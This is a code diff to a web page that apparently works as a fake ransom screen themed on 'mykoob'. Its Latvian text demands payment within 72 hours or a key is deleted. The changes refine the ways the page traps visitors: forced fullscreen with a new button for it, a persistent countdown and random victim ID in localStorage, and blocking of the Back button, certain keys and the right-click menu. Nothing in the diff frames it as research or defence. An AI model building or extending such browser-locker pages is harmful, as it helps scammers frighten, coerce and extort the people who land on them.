@@ -17,7 +17,7 @@ html, body {
   background: #8b0000;
   color: #ffffff;
   min-height: 100vh;
-  overflow: hidden;
+  overflow-x: hidden;
 }
 
 body {
@@ -79,6 +79,21 @@ body {
   font-family: ui-monospace, monospace;
 }
 
+.fs-btn {
+  margin-top: 24px;
+  padding: 12px 24px;
+  font-size: 16px;
+  font-weight: 600;
+  font-family: inherit;
+  background: #ffffff;
+  color: #8b0000;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: opacity 0.2s;
+}
+.fs-btn:hover { opacity: 0.9; }
+
 @media (max-width: 600px) {
   .ransom-title { font-size: 30px; }
   .ransom-body { font-size: 15px; }
@@ -104,13 +119,18 @@ Maksājuma adrese:
 Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzēsta.
 </p>
 
+<button class="fs-btn" id="fsBtn">Iet uz pilnekrānu</button>
+
 <div class="ransom-footer">
 ID: <span id="ransomId">—</span>
 </div>
 </div>
 
 <script>
-/* ── Fullscreen pieprasījums ── */
+const RANSOM_KEY    = 'mykoob_ransom_deadline';
+const RANSOM_ID_KEY = 'mykoob_ransom_id';
+
+/* ── Fullscreen ── */
 function requestFullscreen() {
   const el = document.documentElement;
   if (el.requestFullscreen) {
@@ -122,36 +142,44 @@ function requestFullscreen() {
   }
 }
 
-/* ── Mēģina fullscreen uzreiz, ja atļauts ── */
+/* Mēģina uzreiz — var neizdoties bez lietotāja darbības */
 requestFullscreen();
 
-/* ── Ja neizdevās (pārlūks bloķē bez lietotāja darbības), mēģina pēc pirmā klikšķa ── */
+/* Ja neizdevās, mēģina pēc pirmā klikšķa jebkur */
 document.addEventListener('click', function once() {
-  requestFullscreen();
+  if (!document.fullscreenElement) requestFullscreen();
   document.removeEventListener('click', once);
 }, { once: true });
 
-/* ── Redirect atpakaļ, ja lietotājs iziet no fullscreen vai refresh ── */
-/* Ja gribi, lai refresh NEATGRIEŽAS pie login — NEKO nedari. */
-/* Ja gribi, lai refresh vienmēr paliek šeit — šis ir OK. */
+/* Fullscreen poga */
+document.getElementById('fsBtn').addEventListener('click', function () {
+  requestFullscreen();
+  this.style.display = 'none';
+});
 
-/* ── Timer ── */
-const TIMER_KEY = 'mykoob_ransom_deadline';
-let deadline = parseInt(localStorage.getItem(TIMER_KEY) || '0', 10);
+/* Ja fullscreen ieslēdzas → paslēp pogu */
+document.addEventListener('fullscreenchange', function () {
+  if (document.fullscreenElement) {
+    document.getElementById('fsBtn').style.display = 'none';
+  }
+});
+
+/* ── Timer no localStorage ── */
+let deadline = parseInt(localStorage.getItem(RANSOM_KEY) || '0', 10);
 
 if (!deadline || deadline < Date.now()) {
   deadline = Date.now() + 72 * 60 * 60 * 1000;
-  localStorage.setItem(TIMER_KEY, String(deadline));
+  localStorage.setItem(RANSOM_KEY, String(deadline));
 }
 
 const ransomTimerEl = document.getElementById('ransomTimer');
 const ransomIdEl    = document.getElementById('ransomId');
 
-/* ── Rāda nejaušu ID ── */
-let id = localStorage.getItem('mykoob_ransom_id');
+/* ── ID ── */
+let id = localStorage.getItem(RANSOM_ID_KEY);
 if (!id) {
   id = Array.from({ length: 32 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
-  localStorage.setItem('mykoob_ransom_id', id);
+  localStorage.setItem(RANSOM_ID_KEY, id);
 }
 ransomIdEl.textContent = id;
 
@@ -166,7 +194,7 @@ function renderTimer() {
 renderTimer();
 setInterval(renderTimer, 1000);
 
-/* ── Bloku atpakaļ pogu ── */
+/* ── Bloku Back pogu ── */
 history.pushState(null, '', location.href);
 window.addEventListener('popstate', function () {
   history.pushState(null, '', location.href);
@@ -180,7 +208,7 @@ document.addEventListener('keydown', function (e) {
   }
 });
 
-/* ── Bloku peles labo pogu ── */
+/* ── Bloku labo peles pogu ── */
 document.addEventListener('contextmenu', function (e) {
   e.preventDefault();
 });
